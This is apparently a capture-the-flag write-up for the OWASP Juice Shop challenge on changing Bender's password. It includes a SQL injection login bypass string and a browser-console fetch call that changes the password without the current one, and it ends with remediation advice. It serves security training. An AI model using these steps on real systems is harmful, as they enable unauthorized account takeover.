# Change Bender's Password

| Item | Detail |
|---|---|
| Category | Broken Authentication / Access Control |
| Difficulty | Hard (5-Star) |
| Juice Shop Flag | `score-board#Change Bender's Password` |
| Tools Used | Browser DevTools (Network / Console) |
| Status | Solved |
| Video Demo | [Click Here](https://somup.com/cOfDVHVcPJO) |

---

## 1. Vulnerability Overview

The application allows authenticated users to change their password via the following endpoints:

```
GET /rest/user/change
POST /rest/user/change-password
```

The vulnerability exists because the backend does **not properly validate the current password**.  
In some cases, the request is accepted even when:

- the current password is missing  
- the current password is incorrect  

Additionally, the use of a **GET request for a password change** is insecure and violates best practices.

As a result, once an attacker has a valid session, they can change the password of the logged-in user without knowing the original password.

---

## 2. Attack Goal

The challenge requires changing Bender’s password to:

```
slurmCl4ssic
```

without using:
- SQL Injection (for the password change itself)
- Forgot Password functionality

---

## 3. Identifying the Target User

We first need Bender’s email:

```
bender@juice-sh.op
```

This can be discovered through:

- previous challenges (e.g., User Credentials)
- visible data (reviews, orders)
- known Juice Shop default users

---

## 4. Step-by-Step Exploitation

### 1. Obtain a valid session

Since we don’t know Bender’s password, we log in using a SQL Injection **only to obtain a session token**:

```
bender@juice-sh.op' --
```

Any password works.

This logs us in as Bender and stores a token in `localStorage`.

---

### 2. Observe password change request

- Open DevTools → Network tab  
- Navigate to **Change Password**
- Submit the form with:

```
Current: anything
New: slurmCl4ssic
Repeat: slurmCl4ssic
```

You will see a request like:

```
GET /rest/user/change?current=...&new=...&repeat=...
```

---

### 3. Exploit missing validation

Now remove the `current` parameter completely.

In the browser console:

```javascript
fetch('/rest/user/change?new=slurmCl4ssic&repeat=slurmCl4ssic', {
  method: 'GET',
  headers: {
    'Authorization': localStorage.getItem('token')
  }
})
.then(res => res.json())
.then(data => console.log(data));
```

---

### 4. Result

- The request is accepted  
- Password is changed without verifying the current password, **even tho an error appears**  

Now log out and log in normally:

```
Email: bender@juice-sh.op
Password: slurmCl4ssic
```

---

## 5. Why This Works

The backend contains multiple security flaws:

- No validation of the current password  
- Trust in authenticated session without re-verification  
- Misuse of HTTP GET for sensitive operations  

This allows attackers to change passwords without proper authorization.

---

## 6. Security Impact

- Full account takeover  
- Unauthorized access to user data  
- Ability to impersonate other users  
- Complete compromise of authentication system  

---

## 7. Remediation

To fix this vulnerability:

- Always require and verify the current password  
- Use POST (not GET) for password changes  
- Derive user identity only from the session/token  
- Implement proper validation and error handling  

---

## 8. Key Takeaways

- Password changes must always require strong verification  
- GET requests must never modify sensitive data  
- Authentication alone is not enough for critical actions  
- Small validation flaws can lead to full account takeover  